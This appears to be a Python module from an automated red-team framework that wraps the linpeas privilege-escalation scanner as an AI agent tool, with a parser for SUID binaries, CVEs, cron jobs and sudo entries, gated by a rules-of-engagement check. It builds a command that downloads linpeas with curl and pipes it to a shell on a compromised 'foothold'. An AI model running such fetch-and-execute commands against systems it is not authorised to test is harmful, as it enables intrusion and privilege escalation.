import re

from langchain_core.tools import tool
from pydantic import BaseModel, Field

from autored.logging import get_logger
from autored.roe_guard import roe_guard
from autored.tools.nmap import _save_raw

log = get_logger("tools.linpeas")


class LinpeasResult(BaseModel):
    host_ip: str
    suid_binaries: list[str] = Field(default_factory=list)
    cves: list[str] = Field(default_factory=list)
    cron_jobs: list[str] = Field(default_factory=list)
    sudo_entries: list[str] = Field(default_factory=list)
    interesting_files: list[str] = Field(default_factory=list)
    raw_output_path: str = ""
    command: str = ""
    duration_sec: float = 0.0


def _parse_linpeas_output(text: str, host_ip: str) -> LinpeasResult:
    """Parse linpeas stdout into a LinpeasResult.

    Extracts CVEs, cron jobs, SUID binaries, sudo entries, and interesting
    files from the linpeas text output using section headers (lines that
    start with the ``╚`` box-drawing marker) as delimiters.
    """
    result = LinpeasResult(host_ip=host_ip)

    # Extract CVE identifiers anywhere in the text.
    result.cves = sorted(set(re.findall(r"CVE-\d{4}-\d{4,7}", text)))

    # Helper: pull lines out of a section between a header and the next header.
    def _section(header_re: str) -> list[str]:
        m = re.search(header_re + r"\n(.+?)(?=\n╚|$)", text, re.DOTALL)
        if not m:
            return []
        return [
            line.strip()
            for line in m.group(1).splitlines()
            if line.strip() and not line.startswith("╚")
        ]

    # SUID section header: "╚══════════╣ SUID - Check easy privesc methods for file"
    suid_lines = _section(r"SUID.*?methods for file")
    result.suid_binaries = [line for line in suid_lines if "/" in line]

    # Cron jobs section.
    result.cron_jobs = _section(r"Cron jobs")

    # Sudo section.
    result.sudo_entries = _section(r"Sudo")

    return result


@tool
@roe_guard(allowed_categories=["read_only"])
async def linpeas_run(
    foothold_id: str,
    host_ip: str,
    engagement_id: str = "",
) -> LinpeasResult:
    """Run linpeas on a Linux foothold.

    The command is constructed for execution via the foothold's shell session.
    Actual execution requires the session manager (Phase 6). For now, this
    tool builds the command, saves it as raw evidence, and returns an empty
    result — the parser is invoked separately against captured output.

    Args:
        foothold_id: ID of the foothold to enumerate
        host_ip: IP of the foothold host
        engagement_id: Current engagement ID

    Returns:
        LinpeasResult (empty findings until execution is wired in Phase 6).
    """
    log.info("linpeas_start", host_ip=host_ip, foothold_id=foothold_id)
    # Command to run via foothold shell (curl linpeas + execute).
    cmd_str = (
        "curl -sL "
        "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh "
        "| sh"
    )
    raw_path = await _save_raw("linpeas_cmd", host_ip, cmd_str, "", engagement_id)
    log.info("linpeas_done", host_ip=host_ip, note="command saved, execution in Phase 6")
    return LinpeasResult(host_ip=host_ip, raw_output_path=raw_path, command=cmd_str)
